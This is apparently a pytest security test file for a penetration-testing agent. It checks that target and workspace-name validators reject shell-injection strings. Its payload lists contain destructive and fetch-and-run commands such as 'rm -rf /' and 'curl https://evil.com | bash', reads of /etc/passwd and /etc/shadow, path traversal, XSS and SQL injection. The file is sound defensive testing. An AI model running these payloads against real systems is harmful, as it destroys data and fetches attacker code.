"""Security tests: command injection via tool arguments and runtime execution.

These tests verify that injection payloads passed through tool argument parsing
and target-gathering do NOT execute arbitrary commands or bypass constraints.
They do NOT execute real shell commands with dangerous payloads; they test the
parsing and validation layers.
"""

import pytest

from pentestagent.workspaces.validation import gather_candidate_targets, is_target_in_scope
from pentestagent.workspaces.manager import TargetManager, WorkspaceError


# ---------------------------------------------------------------------------
# Injection payloads in target extraction
# ---------------------------------------------------------------------------

SHELL_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& curl https://evil.com | bash",
    "> /tmp/pwned",
    "|| id",
    "\n/bin/bash",
    "${IFS}id",
    "%0a/bin/sh",
    "'; DROP TABLE users; --",
]


class TestCommandInjectionInTargetExtraction:
    """gather_candidate_targets must not interpret shell syntax — it only collects strings."""

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_payload_returned_as_literal_string(self, payload):
        result = gather_candidate_targets({"target": payload})
        # The payload is returned verbatim as a string, never executed
        assert payload in result

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_injection_payload_fails_scope_check(self, payload):
        # Even if extracted, injection strings should fail scope validation
        # because they are not valid IPs/CIDRs/hostnames
        assert is_target_in_scope(payload, ["192.168.1.0/24"]) is False

    @pytest.mark.parametrize("payload", SHELL_INJECTION_PAYLOADS)
    def test_injection_payload_rejected_by_target_manager(self, payload):
        # TargetManager.normalize_target must raise for injection strings
        with pytest.raises((WorkspaceError, Exception)):
            TargetManager.normalize_target(payload)


# ---------------------------------------------------------------------------
# Injection payloads in workspace names
# ---------------------------------------------------------------------------

WORKSPACE_NAME_PAYLOADS = [
    "../../../etc/passwd",
    "../../root/.ssh/authorized_keys",
    "/etc/shadow",
    "name; rm -rf /",
    "name$(id)",
    "name`id`",
    "name|cat /etc/passwd",
    "name && whoami",
    "<script>alert(1)</script>",
    "name\x00null",
    "name\nnewline",
    "a" * 65,
]


class TestCommandInjectionInWorkspaceNames:
    @pytest.mark.parametrize("payload", WORKSPACE_NAME_PAYLOADS)
    def test_workspace_name_injection_rejected(self, tmp_path, payload):
        from pentestagent.workspaces.manager import WorkspaceManager
        mgr = WorkspaceManager(root=tmp_path)
        with pytest.raises(WorkspaceError):
            mgr.validate_name(payload)


# ---------------------------------------------------------------------------
# Injection payloads as targets in WorkspaceManager
# ---------------------------------------------------------------------------

INVALID_TARGET_PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "|| id",
    "&& curl evil.com | sh",
    "<script>",
    "../../etc/hosts",
    "\x00null\x00byte",
    "host name with spaces",
]


class TestCommandInjectionInTargets:
    @pytest.mark.parametrize("payload", INVALID_TARGET_PAYLOADS)
    def test_invalid_target_rejected_by_validate(self, payload):
        assert TargetManager.validate(payload) is False

    @pytest.mark.parametrize("payload", INVALID_TARGET_PAYLOADS)
    def test_invalid_target_raises_on_normalize(self, payload):
        with pytest.raises((WorkspaceError, Exception)):
            TargetManager.normalize_target(payload)


# ---------------------------------------------------------------------------
# Injection via gather_candidate_targets with list values
# ---------------------------------------------------------------------------

class TestInjectionInListTargets:
    def test_list_with_injection_extracted_as_strings(self):
        payload = "; cat /etc/passwd"
        result = gather_candidate_targets({"hosts": ["192.168.1.1", payload]})
        assert "192.168.1.1" in result
        assert payload in result  # extracted but not executed

    def test_list_injection_fails_scope_validation(self):
        payload = "$(id)"
        result = gather_candidate_targets({"targets": [payload]})
        for candidate in result:
            assert is_target_in_scope(candidate, ["192.168.1.0/24"]) is False


# ---------------------------------------------------------------------------
# URL-based injection in web targets
# ---------------------------------------------------------------------------

URL_INJECTION_PAYLOADS = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "ftp://evil.com/malware",
]


class TestURLInjectionTargets:
    @pytest.mark.parametrize("url", URL_INJECTION_PAYLOADS)
    def test_url_injection_fails_scope_check(self, url):
        # URL-scheme injections should not match IP/hostname scope
        assert is_target_in_scope(url, ["192.168.1.0/24"]) is False
